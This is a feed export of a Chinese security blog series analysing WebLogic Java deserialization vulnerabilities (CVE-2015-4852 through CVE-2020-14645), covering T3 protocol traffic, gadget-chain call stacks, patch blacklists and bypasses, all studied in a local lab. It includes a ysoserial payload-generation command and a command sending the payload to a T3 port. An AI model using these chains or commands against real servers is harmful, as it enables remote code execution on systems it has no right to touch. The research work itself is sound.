SimpleBinaryEntry (com.tangosol.internal.util)</span><br><span class="line">equals:<span class="number">392</span>, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">equals:<span class="number">3415</span>, Base (com.tangosol.util)</span><br><span class="line">put:<span class="number">213</span>, LiteMap (com.tangosol.util)</span><br><span class="line">readMap:<span class="number">1900</span>, ExternalizableHelper (com.tangosol.util)</span><br><span class="line">readExternal:<span class="number">190</span>, ConditionalPutAll (com.tangosol.util.processor)</span><br><span class="line">readExternalizableLite:<span class="number">2265</span>, ExternalizableHelper (com.tangosol.util)</span><br><span class="line">readObjectInternal:<span class="number">2579</span>, ExternalizableHelper (com.tangosol.util)</span><br><span class="line">readObject:<span class="number">2524</span>, ExternalizableHelper (com.tangosol.util)</span><br><span class="line">readObject:<span class="number">2502</span>, ExternalizableHelper (com.tangosol.util)</span><br><span class="line">readExternal:<span class="number">406</span>, AttributeHolder (com.tangosol.coherence.servlet)</span><br><span class="line">readExternal:<span class="number">371</span>, AttributeHolder (com.tangosol.coherence.servlet)</span><br><span class="line">readExternalData:<span class="number">2118</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">2067</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1573</span>, ObjectInputStream (java.io)</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.kingkk.com/2020/08/CVE-2020-14644%E5%88%86%E6%9E%90%E4%B8%8Egadget%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/">CVE-2020-14644分析与gadget的一些思考</a></p><p><a href="https://xz.aliyun.com/t/9068">How Did I Find Weblogic T3 RCE</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;黑名单机制必然会推动两种研究方向的发展：一是挖掘不在黑名单的新组件，是为绕过规则；二是发掘检查的盲区，是为绕过逻辑。&lt;/p&gt;
&lt;h2 id=&quot;CVE-2020-14756&quot;&gt;&lt;a href=&quot;#CVE-2020-14756&quot; class=&quot;headerlink&quot; title</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Weblogic" scheme="https://hosch3n.github.io/tags/Weblogic/"/>
    
    <category term="CVE-2020-14756" scheme="https://hosch3n.github.io/tags/CVE-2020-14756/"/>
    
    <category term="CVE-2020-14644" scheme="https://hosch3n.github.io/tags/CVE-2020-14644/"/>
    
    <category term="CVE-2021-2135" scheme="https://hosch3n.github.io/tags/CVE-2021-2135/"/>
    
  </entry>
  
  <entry>
    <title>Weblogic安全漫谈(三)</title>
    <link href="https://hosch3n.github.io/2023/02/28/Weblogic%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://hosch3n.github.io/2023/02/28/Weblogic%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%EF%BC%88%E4%B8%89%EF%BC%89/</id>
    <published>2023-02-28T09:16:51.000Z</published>
    <updated>2023-03-10T06:50:44.786Z</updated>
    
    <content type="html"><![CDATA[<p>经历15到18的3年迭代后，Weblogic的黑名单逐渐完善，废掉CC反序列化更是釜底抽薪。另一方面也促使研究员去挖掘新组件新利用链，这篇介绍的就是@testbnull在发现Spring写文件链后[1]，继续挖掘出<code>coherence.jar</code>中的漏洞利用链及后续绕过。因为10.3.6默认没有启用coherence，我们用12.2.1.3作为调试环境。</p><h2 id="CVE-2020-2555"><a href="#CVE-2020-2555" class="headerlink" title="CVE-2020-2555"></a>CVE-2020-2555</h2><p>CC链的核心是<code>InvokerTransformer#transform</code>方法对<code>Method.invoke</code>的调用，Weblogic几百个lib中有没有类CC链呢？</p><ol><li><p>查找调用了<code>Method.invoke</code>的方法</p></li><li><p>筛出可被序列化的方法所在类</p></li><li><p>剔除参数不可控的结果</p></li></ol><p>注意到<code>com.tangosol.util.extractor.ReflectionExtractor#extract</code>，与<code>transform</code>不说丝毫不差至少也是大同小异。</p><p><img src="/img/weblogicc_a.png"></p><p>同包中也有与<code>ChainedTransformer</code>作用一致的<code>ChainedExtractor</code>，<code>ReflectionExtractor</code>实现了<code>ValueExtractor</code>接口满足类型要求：</p><p><img src="/img/weblogicc_b.png"></p><p>tabby的分析找到了关键的<code>com.tangosol.util.filter.LimitFilter#toString</code>，这样就能链上CC5开头用的<code>BadAttributeValueExpException</code>实现完整利用链。</p><p><img src="/img/weblogicc_c.png"></p><p>更进一步可以找到很多具有套娃能力的类方法：</p><p><img src="/img/weblogicc_d.png"></p><p>除此以外注意到期间出现过的MVEL包，方便地查到也可以<code>com.tangosol.coherence.rest.util.extractor.MvelExtractor#extract</code>作为sink执行MVEL表达式。</p><p><img src="/img/weblogicc_e.png"></p><p>根据关键类方法的变量要求构建利用链就行：</p><p><img src="/img/weblogicc_f.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">extract:<span class="number">95</span>, MvelExtractor (com.tangosol.coherence.rest.util.extractor)</span><br><span class="line"></span><br><span class="line">extract:<span class="number">112</span>, ReflectionExtractor (com.tangosol.util.extractor)</span><br><span class="line">extract:<span class="number">83</span>, ChainedExtractor (com.tangosol.util.extractor)</span><br><span class="line"></span><br><span class="line"><span class="comment">// extract:96, MultiExtractor (com.tangosol.util.extractor)</span></span><br><span class="line"></span><br><span class="line">toString:<span class="number">581</span>, LimitFilter (com.tangosol.util.filter)</span><br><span class="line">readObject:<span class="number">86</span>, BadAttributeValueExpException (javax.management)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1170</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">2178</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">2069</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1573</span>, ObjectInputStream (java.io)</span><br></pre></td></tr></table></figure><h2 id="CVE-2020-2883"><a href="#CVE-2020-2883" class="headerlink" title="CVE-2020-2883"></a>CVE-2020-2883</h2><p>上文搜索”具有套娃能力的类”时，有一个与很多节点是<code>[ALIAS]</code>关系的抽象基类<code>com.tangosol.util.extractor.AbstractExtractor</code>在<code>compare</code>中调用了<code>extract</code>：</p><p><img src="/img/weblogicc_g.png"></p><p>这样就能链上CC2开头用的<code>PriorityQueue</code>实现完整利用链。</p><p><img src="/img/weblogicc_h.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">extract:<span class="number">95</span>, MvelExtractor (com.tangosol.coherence.rest.util.extractor)</span><br><span class="line"></span><br><span class="line">extract:<span class="number">112</span>, ReflectionExtractor (com.tangosol.util.extractor)</span><br><span class="line">extract:<span class="number">83</span>, ChainedExtractor (com.tangosol.util.extractor)</span><br><span class="line"></span><br><span class="line"><span class="comment">// extract:96, MultiExtractor (com.tangosol.util.extractor)</span></span><br><span class="line"></span><br><span class="line">compare:<span class="number">79</span>, AbstractExtractor (com.tangosol.util.extractor)</span><br><span class="line">siftDownUsingComparator:<span class="number">722</span>, PriorityQueue (java.util)</span><br><span class="line">siftDown:<span class="number">688</span>, PriorityQueue (java.util)</span><br><span class="line">heapify:<span class="number">737</span>, PriorityQueue (java.util)</span><br><span class="line">readObject:<span class="number">797</span>, PriorityQueue (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1170</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">2178</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">2069</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1573</span>, ObjectInputStream (java.io)</span><br></pre></td></tr></table></figure><p>Weblogic在后面的补丁将两个sink类加入了黑名单：</p><p><img src="/img/weblogicc_i.png"></p><h2 id="CVE-2020-14645"><a href="#CVE-2020-14645" class="headerlink" title="CVE-2020-14645"></a>CVE-2020-14645</h2><p><img src="/img/weblogicc_j.png"></p><p><img src="/img/weblogicc_k.png"></p><p><code>UniversalExtractor</code>看似能调用任意类方法，实际受内部逻辑限制（尤其是<code>CanonicalNames#computeValueExtractorCanonicalName</code>）只能调到任意类的无参<code>get</code>/<code>is</code>方法，可以通过一些getter链触发JNDI完成利用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">extractComplex:<span class="number">432</span>, UniversalExtractor (com.tangosol.util.extractor)</span><br><span class="line">extract:<span class="number">175</span>, UniversalExtractor (com.tangosol.util.extractor)</span><br><span class="line"><span class="comment">// extract:105, ChainedExtractor (com.tangosol.util.extractor)</span></span><br><span class="line"><span class="comment">// extract:96, MultiExtractor (com.tangosol.util.extractor)</span></span><br><span class="line">compare:<span class="number">143</span>, AbstractExtractor (com.tangosol.util.extractor)</span><br><span class="line">siftDownUsingComparator:<span class="number">722</span>, PriorityQueue (java.util)</span><br><span class="line">siftDown:<span class="number">688</span>, PriorityQueue (java.util)</span><br><span class="line">heapify:<span class="number">737</span>, PriorityQueue (java.util)</span><br><span class="line">readObject:<span class="number">797</span>, PriorityQueue (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1170</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">2178</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">2069</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1573</span>, ObjectInputStream (java.io)</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><p><a href="https://medium.com/nightst0rm/t%C3%B4i-%C4%91%C3%A3-chi%E1%BA%BFm-quy%E1%BB%81n-%C4%91i%E1%BB%81u-khi%E1%BB%83n-c%E1%BB%A7a-r%E1%BA%A5t-nhi%E1%BB%81u-trang-web-nh%C6%B0-th%E1%BA%BF-n%C3%A0o-61efdf4a03f5">https://medium.com/nightst0rm/t%C3%B4i-%C4%91%C3%A3-chi%E1%BA%BFm-quy%E1%BB%81n-%C4%91i%E1%BB%81u-khi%E1%BB%83n-c%E1%BB%A7a-r%E1%BA%A5t-nhi%E1%BB%81u-trang-web-nh%C6%B0-th%E1%BA%BF-n%C3%A0o-61efdf4a03f5</a></p></li><li><p><a href="https://testbnull.medium.com/the-art-of-deserialization-gadget-hunting-part-3-how-i-found-cve-2020-2555-by-known-tools-67819b29cb63">https://testbnull.medium.com/the-art-of-deserialization-gadget-hunting-part-3-how-i-found-cve-2020-2555-by-known-tools-67819b29cb63</a></p></li><li><p><a href="https://www.yaowendao.com/2020/09/06/%E4%BB%8EWebLogic%E4%B8%80%E8%84%89%E7%9B%B8%E6%89%BF%E7%9A%84%E4%B8%89%E4%B8%AA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CVE%E8%AF%B4%E8%B5%B7/">https://www.yaowendao.com/2020/09/06/%E4%BB%8EWebLogic%E4%B8%80%E8%84%89%E7%9B%B8%E6%89%BF%E7%9A%84%E4%B8%89%E4%B8%AA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CVE%E8%AF%B4%E8%B5%B7/</a></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;经历15到18的3年迭代后，Weblogic的黑名单逐渐完善，废掉CC反序列化更是釜底抽薪。另一方面也促使研究员去挖掘新组件新利用链，这篇介绍的就是@testbnull在发现Spring写文件链后[1]，继续挖掘出&lt;code&gt;coherence.jar&lt;/code&gt;中的漏洞</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Weblogic" scheme="https://hosch3n.github.io/tags/Weblogic/"/>
    
    <category term="CVE-2020-2555" scheme="https://hosch3n.github.io/tags/CVE-2020-2555/"/>
    
    <category term="CVE-2020-2883" scheme="https://hosch3n.github.io/tags/CVE-2020-2883/"/>
    
    <category term="CVE-2020-14645" scheme="https://hosch3n.github.io/tags/CVE-2020-14645/"/>
    
  </entry>
  
  <entry>
    <title>Weblogic安全漫谈(二)</title>
    <link href="https://hosch3n.github.io/2023/02/21/Weblogic%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://hosch3n.github.io/2023/02/21/Weblogic%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2023-02-21T04:50:17.000Z</published>
    <updated>2023-02-28T14:51:37.325Z</updated>
    
    <content type="html"><![CDATA[<p>Weblogic对于10.3.6推出了p20780171和p22248372用于修复CVE-2015-4852，在补丁详情中又提示了p21984589是它的超集，所以直接装这个合集。跟着压缩包里自带的<code>README.txt</code>走就行，注意一点是要改一下<code>bsu.sh</code>中的内存限制，不然会遇到<code>Java heap space OutOfMemoryError</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">unzip p21984589_1036_Generic.zip -d /u01/app/oracle/middleware/utils/bsu/cache_dir/</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /u01/app/oracle/middleware/utils/bsu/</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&#x27;s/512/1024/&#x27;</span> bsu.sh</span><br><span class="line"></span><br><span class="line">./bsu.sh -install -patch_download_dir=/u01/app/oracle/middleware/utils/bsu/cache_dir -patchlist=S8C2 -prod_dir=/u01/app/oracle/middleware/wlserver</span><br><span class="line"></span><br><span class="line">. /u01/app/oracle/middleware/wlserver/server/bin/setWLSEnv.sh</span><br><span class="line">/java/bin/java weblogic.version</span><br></pre></td></tr></table></figure><p>补丁在重写的<code>ServerChannelInputStream#resolveClass</code>中新增了类名黑名单，加入了CC链比较关键的包。</p><p><img src="/img/weblogicb_a.png"></p><p><img src="/img/weblogicb_b.png"></p><p>梳理一下：</p><ol><li><p>原生反序列化依然存在，流程中的各个关键方法可用</p></li><li><p>CC链在黑名单以外的部分，仍然可以用作调用链</p></li><li><p>黑名单类不在<code>ServerChannelInputStream</code>做反序列化就不受限制</p></li></ol><p>根据第三点先获取所有用到<code>readObject</code>的地方，用<code>Serializable.class.isAssignableFrom(clazz)</code>筛出可被序列化的类，筛出数据可控的二次反序列化。找到的两个可用类刚好对应两个CVE。</p><h2 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h2><p>看到<code>weblogic.jms.common.StreamMessageImpl#readExternal</code>，完成父类<code>readExternal</code>后读到的字节是十进制1时会进入存在<code>readObject</code>的分支。</p><p><img src="/img/weblogicb_c.png"></p><p>跟进中间会经过的<code>createPayload</code>方法，读到的整数大于<code>CHUNK_LINK_THRESHOLD</code>会做一些处理。中间这块的处理看不太懂，我们假设它不满足判断继续往后走，一直跟到<code>Chunk.createOneSharedChunk</code>。</p><p><img src="/img/weblogicb_d.png"></p><p>虽然中间一些<code>Chunk</code>的判断和操作太菜了看不懂，但到了这里就能看出，这个先前读到的被一路传过来的整数是后段数据长度。后面这段数据被完整读出并封装赋值给<code>this.payload</code>，随后进行第二次反序列化。</p><p><img src="/img/weblogicb_e.png"></p><p>按照同样的数据顺序重写<code>StreamMessageImpl</code>的<code>writeExternal</code>，写入相应格式的CC链序列化payload，再经过一次正常新建类对象并经过第二次序列化，最后用上一篇的EXP打出去就行。</p><p><img src="/img/weblogicb_f.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">readExternal:<span class="number">1433</span>, StreamMessageImpl (weblogic.jms.common)</span><br><span class="line">readExternalData:<span class="number">1814</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1773</span>, ObjectInputStream (java.io)</span><br><span class="line"></span><br><span class="line">resolveClass:<span class="number">110</span>, InboundMsgAbbrev$ServerChannelInputStream (weblogic.rjvm)</span><br><span class="line">readNonProxyDesc:<span class="number">1589</span>, ObjectInputStream (java.io)</span><br><span class="line">readClassDesc:<span class="number">1494</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1748</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1327</span>, ObjectInputStream (java.io)</span><br></pre></td></tr></table></figure><h2 id="CVE-2016-3510"><a href="#CVE-2016-3510" class="headerlink" title="CVE-2016-3510"></a>CVE-2016-3510</h2><p>看到<code>weblogic.corba.utils.MarshalledObject#readResolve</code>，是比上一个品相更好的二次反序列化类。<code>this.objBytes</code>属性来自构造函数传入的对象，直接将payload对象作为参数给进去就行。</p><p><img src="/img/weblogicb_g.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">readResolve:<span class="number">58</span>, MarshalledObject (weblogic.corba.utils)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">39</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">25</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">597</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadResolve:<span class="number">1056</span>, ObjectStreamClass (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1784</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1327</span>, ObjectInputStream (java.io)</span><br></pre></td></tr></table></figure><hr><p><img src="/img/weblogicb_h.png"></p><p>补丁在上述两个类反序列化前单独添加了检查，随后进入下一个对RMI的利用阶段。</p><h2 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h2><p>与此前《攻击JavaRMI概述》中唯一不同的一点是：第一步触发反序列化时的通讯协议，从Java原生的JRMP协议变为了Weblogic的T3协议。生成一个JRMPClient的payload用于在目标反序列化时发起JRMP请求，其它攻击流程一致。</p><h2 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2><p><code>ysoserial</code>的<code>RMIRegistryExploit</code>设计用于攻击Java原生RMI注册端，用了给<code>JRMPClient</code>的payload套上Registry动态代理的方式，来兼容Java原生registry.bind方法的参数要求。</p><p><img src="/img/weblogicb_i.png"></p><p>而这大概就是Weblogic企图靠<code>InboundMsgAbbrev</code>重写<code>resolveProxyClass</code>作为CVE-2017-3248的修复方式原因之一。我们是用自己的EXP作为T3客户端，不存在参数类型兼容的问题，直接去掉动态代理类的包装即可绕过检查。（或者使用不同的接口代理）</p><p>不过与此同时补丁也给CC包加上了手动开关，基本断了这条链的生路。所以这一阶段的Sink链大多基于7u21/8u20。</p><p><img src="/img/weblogicb_j.png"></p><h2 id="CVE-2018-2893"><a href="#CVE-2018-2893" class="headerlink" title="CVE-2018-2893"></a>CVE-2018-2893</h2><p>据参考文章，在<code>cpuapr2018</code>补丁中黑名单新增了<code>sun.rmi.server.UnicastRef</code>。看到<code>java.rmi.server.RemoteObjectInvocationHandler</code>会使用父类的<code>RemoteObject</code>，读到<code>refClassName</code>时就会做一次神奇的第二次反序列化，自带绕过特效。</p><p><img src="/img/weblogicb_k.png"></p><p><img src="/img/weblogicb_l.png"></p><p>要素察觉！CVE-2016-0638和CVE-2016-3510也是二次反序列化绕过黑名单，不过<code>MarshalledObject</code>被去掉了Serializable接口，<code>StreamMessageImpl</code>则仍然可用于绕过。</p><h2 id="CVE-2018-3245"><a href="#CVE-2018-3245" class="headerlink" title="CVE-2018-3245"></a>CVE-2018-3245</h2><p>在<code>cpujul2018</code>补丁中黑名单继续增加了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.rmi.activation</span><br><span class="line">sun.rmi.server</span><br><span class="line">java.rmi.server.UnicastRemoteObject</span><br><span class="line">java.rmi.server.RemoteObjectInvocationHandler</span><br></pre></td></tr></table></figure><p><code>RemoteObject</code>不在黑名单的子类们仍然可用，直到<code>cpuoct2018</code>将基类纳入黑名单。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><p><a href="https://paper.seebug.org/584">Weblogic 反序列化漏洞(CVE-2018-2628)漫谈</a></p></li><li><p><a href="https://xz.aliyun.com/t/2479">Weblogic JRMP反序列化漏洞回顾</a></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Weblogic对于10.3.6推出了p20780171和p22248372用于修复CVE-2015-4852，在补丁详情中又提示了p21984589是它的超集，所以直接装这个合集。跟着压缩包里自带的&lt;code&gt;README.txt&lt;/code&gt;走就行，注意一点是要改一下&lt;</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Weblogic" scheme="https://hosch3n.github.io/tags/Weblogic/"/>
    
    <category term="CVE-2016-0638" scheme="https://hosch3n.github.io/tags/CVE-2016-0638/"/>
    
    <category term="CVE-2016-3510" scheme="https://hosch3n.github.io/tags/CVE-2016-3510/"/>
    
    <category term="CVE-2017-3248" scheme="https://hosch3n.github.io/tags/CVE-2017-3248/"/>
    
    <category term="CVE-2018-2628" scheme="https://hosch3n.github.io/tags/CVE-2018-2628/"/>
    
    <category term="CVE-2018-2893" scheme="https://hosch3n.github.io/tags/CVE-2018-2893/"/>
    
    <category term="CVE-2018-3245" scheme="https://hosch3n.github.io/tags/CVE-2018-3245/"/>
    
  </entry>
  
  <entry>
    <title>Weblogic安全漫谈(一)</title>
    <link href="https://hosch3n.github.io/2023/02/17/Weblogic%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://hosch3n.github.io/2023/02/17/Weblogic%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2023-02-17T09:11:48.000Z</published>
    <updated>2023-02-22T06:17:59.537Z</updated>
    
    <content type="html"><![CDATA[<p>@frohoff在2015年初发现<code>commons-collections</code>的反序列化利用链并发布<code>ysoserial</code>工具9个月后[1]，@breenmachine对众多知名Java中间件的利用文章[2]使Java反序列化漏洞变得广为人知，Weblogic首当其冲的就是大家多少都有点耳熟的T3协议反序列化。</p><h2 id="环境搭建与补丁定位"><a href="#环境搭建与补丁定位" class="headerlink" title="环境搭建与补丁定位"></a>环境搭建与补丁定位</h2><p>Weblogic官网提供无补丁的初始版本下载[3]，为了方便后续调试分析可以先把几个大版本的安装包（Generic）、以及某些有较大安全特性变化的JDK准备好。</p><p>对于安全补丁，官方只提供给付费帐户下载，但普通账户可以在高级搜索页面[4]列出对应版本的补丁号与发布时间，结合官方安全公告页的CVE发布时间[5]基本可以让CVE对应上Patch。</p><p><img src="/img/weblogica_a.png"></p><p>有了Patch号可以通过CSDN+淘宝积分或者闲鱼黑心卖家等等方式下到补丁，Patch详情页里可以看到哈希，有官方原版zip洁癖的同学也可以对一下。</p><p>环境搭建用WeblogicEnvironment[6]构建不同JDK与Weblogic版本的docker镜像会比较方便，后续也能用容器区分不同的补丁版本。运行前需要参考<code>issues/8</code>改一下Dockerfile，另外就是根据个人需要做适当调整了，比如Weblogic开启的远程调试端口默认为8453（对应IDEA默认的5005）、调整JDK版本等等。</p><h2 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h2><p>《攻击JavaRMI概述》[7]中说过JavaRMI机制基于JRMP协议通信，Weblogic有一个与JRMP同类的应用层协议就是T3。作为Oracle商用产品的东西，协议实现并不开源且没有文档，主要靠连蒙带猜和逆向去管中窥豹。</p><p><code>/u01/app/oracle/Domains/ExampleSilentWTDomain/bin/stopWebLogic.sh</code>用到了T3协议去停掉Weblogic，在执行前挂上<code>tcpdump -i any -w t3-stop.pcap</code>抓一下数据包。</p><p><img src="/img/weblogica_b.png"></p><p>Java原生序列化流通过十六进制为<code>ac ed 00 05</code>的字节作为开头的标识（黑话管它叫做魔术字节），<code>ysoserial</code>也正是通过原生序列化生成的payload，自然能简单粗暴地想到是不是直接替换就行了？要替换掉哪些部分呢？能看出先进行了第一次通信，请求和响应都是可读的ASCII字符，后续的的请求中似乎也没有用到响应的内容。</p><p><img src="/img/weblogica_c.png"></p><p>把第二次请求字节流扒下来反序列化并处理异常后可以发现存在五个Object，因为WebServer每个请求通常会起一个新的线程来处理，不用担心像内核Pwn一样没处理好异常整个系统蹦掉，那么<del>本着节能减排的原则</del>从第一处魔术字节开始替换为payload，后续部分抛掉不管必然会报错，但问题不大。即将原本第二次请求的<code>A + Serial + B + Serial + ...</code>改成<code>A + Payload</code>。</p><p>构造如下脚本用作发送payload的客户端，它好比航天发射场组装火箭后打出去，payload就是火箭里用于开展科学实验的载荷。</p><p><img src="/img/weblogica_d.png"></p><p>那么问题来了，首先是为什么要先经过第一次通信交互（t3Bootstrap）。我们大家都知道在黑盒打不通的时候通常都是打不通的，对此小编也感到很惊讶，将payload硬莽过去只会得不到响应。这就如同需要用火箭将实验载荷送到预定轨道一样。</p><p>第二个问题是payload前加上的那些字节数据是干嘛的，即火箭为什么要设计构建成这样，自然是为了让载荷顺利进入预定轨道。。。相信有的同学想喷我了，这里看似相互解释了实则什么都没解释，如果前面还能从没响应的现象下手企图萌混过关，但这里不啃代码是圆不过去了。</p><p>我知道你很急，但你先别急。我们先来看看靴微简单一点的第三个问题，即payload用什么？要使用<code>ysoserial</code>生成的CC链就需要看目标环境有没有相应依赖，快速但不准确的方法是直接找有没有Jar包。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># find /u01/ -name &quot;*commons*collections*.jar&quot;</span></span><br><span class="line">/u01/app/oracle/middleware/modules/com.bea.core.apache.commons.collections_3.2.0.jar</span><br></pre></td></tr></table></figure><ul><li>为了更精确定位则可以采用META-INF等信息判断版本、运行时相应上下文能否调到关键类等等方法。</li></ul><p>如此我们便能利用这个祖师爷漏洞，对着周朝出土的Weblogic一顿RCE了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections6 <span class="string">&quot;touch /tmp/pwned&quot;</span> &gt; /tmp/poc.ser</span><br><span class="line"></span><br><span class="line">python3 t3client.py 127.0.0.1 7001 /tmp/poc.ser</span><br><span class="line"></span><br><span class="line"><span class="comment"># ls -al /tmp/ | grep &#x27;pwned&#x27;</span></span><br><span class="line">-rw-r----- 1 root root    0 Feb 17 